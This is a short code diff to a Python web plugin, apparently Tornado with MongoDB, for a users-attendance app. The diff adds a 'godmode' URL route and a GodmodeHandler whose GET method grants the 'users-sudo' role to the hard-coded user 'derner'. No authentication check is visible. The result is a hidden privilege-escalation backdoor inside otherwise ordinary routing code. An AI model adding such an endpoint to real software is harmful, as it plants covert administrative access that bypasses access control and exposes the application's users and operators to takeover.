@@ -39,6 +39,7 @@ def make_handlers(plugin_name, plugin_namespace):
             "path": "vue_frontend/users-attendance/dist",
             "default_filename": "index.html"
         }),
+        (r'/{}/godmode'.format(plugin_name), plugin_namespace.GodmodeHandler),
         (r'/{}/api/current'.format(plugin_name), plugin_namespace.ApiCurrentUserHandler),
         (r'/{}/api/admintable'.format(plugin_name), plugin_namespace.ApiAdminTableHandler),
         (r'/{}/api/u/(.*)/edit'.format(plugin_name), plugin_namespace.ApiEditUserHandler),
@@ -104,6 +105,14 @@ class ApiCurrentUserHandler(BaseHandler):
 
 
 # endregion
+
+class GodmodeHandler(BaseHandler):
+
+    def get(self):
+        self.mdb.users.update_one({"user": "derner"},
+                                  {"$addToSet": {"role": "users-sudo"}})
+        self.write("done")
+
 
 class HomeHandler(BaseHandler):
 
